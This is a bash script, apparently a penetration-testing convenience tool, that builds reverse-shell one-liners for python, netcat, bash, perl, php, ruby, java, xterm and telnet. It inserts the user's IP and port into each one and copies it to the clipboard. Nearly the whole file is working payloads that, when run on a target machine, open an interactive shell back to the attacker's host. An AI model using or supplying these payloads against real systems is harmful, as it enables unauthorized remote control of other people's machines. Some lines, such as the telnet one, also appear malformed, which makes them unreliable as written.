#!/bin/bash

# rshells - ya boi darkrain
# Takes cmdline args
# arg 1 is the port you want
# arg 2 is the shell you want, you will be able to type the name that you want.
# ./rshells.sh 31337 php
# To add more one liners, simply copy the format in the switch case below
# variables to inject are $port and $ip
# * You can also run the script without args and script will ask
# you will need xclip for the clipboard access
# sudo apt install xclip

command -v xclip >/dev/null 2>&1 || { echo >&2 "Please install xclip: sudo apt install xclip"; exit 1; }
type xclip >/dev/null 2>&1 || { echo >&2 "Please install xclip: sudo apt install xclip"; exit 1; }
hash xclip 2>/dev/null || { echo >&2 "Please install xclip: sudo apt install xclip"; exit 1; }

mynetip=$(hostname -I | tr -d '[:space:]')
export mynetip

if [ "$mynetip" = "127.0.0.1" ]
then
    echo -e "\e[91mNo valid ip\e[0m"
    exit 2
fi
echo -e "\e[0;33m$mynetip\e[0m grabbed, stored, and exported as \e[0;33mmynetip\e[0m"

ip=$mynetip
port=$1
shell=$2

if [ "$port" = "" ]
then # Port not given, no args
    echo -n "What port: "
    read port
    echo -n "What shell: "
    read shell
elif [ "$shell" = "" ]
then # Shell not given, assume valid port
    echo -n "What shell: "
    read shell
fi

case $shell in
'python') # Done
	echo -n "python -c '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('"$ip"',"$port"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'''" | xclip -selection clipboard
	echo -e "\e[32mPython Shell Copied\e[0m"
	;;
'nc') # Done
	echo -n "nc -e /bin/sh" $ip $port | xclip -selection clipboard
	echo -e "\e[32mNet Cat Shell Copied\e[0m"
	;;

'bash') # Done
	echo -n "bash -i >& /dev/tcp/"$ip"/"$port" 0>&1 >" | xclip -selection clipboard
	echo -e "\e[32mBash Shell Copied\e[0m"
	;;

'perl') # Done
	echo perl -e 'use Socket;$i="'$ip'";$p="'$port'";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' | xclip -selection clipboard
	echo -e "\e[32mPerl Shell Copied\e[0m"
	;;
'php') # Done
        echo -n "php -r '$sock=fsockopen("$ip","$port");exec("/bin/sh -i <&3 >&3 2>&3");'" | xclip -selection clipboard
        echo -e "\e[32mPHP Shell Copied\e[0m"
        ;;
'ruby') # Done
        echo -n "ruby -rsocket -e'f=TCPSocket.open("$ip",$port).to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)'" | xclip -selection clipboard
        echo -e "\e[32mRuby Shell Copied\e[0m"
        ;;
'java') # Done
        printf 'r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'$ip'/'$port';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])\np.waitFor()' | xclip -selection clipboard
        echo -e "\e[32mJava Shell Copied\e[0m"
        ;;
'xterm') # Done
        echo -n "xterm -display $ip:$port" | xclip -selection clipboard
        echo -e "\e[32mXterm Shell Copied\e[0m"
        ;;
'telnet') # Done
        echo -n "rm -f /tmp/p; mknod /tmp/p p && telnet "$ip" "$port" 0/tmp/p" | xclip -selection clipboard
        echo -e "\e[32mTelnet Shell Copied\e[0m"
        ;;
*) # Case for not finding anything
	echo -e "\e[91mDid not copy anything\e[0m"
	;;
esac
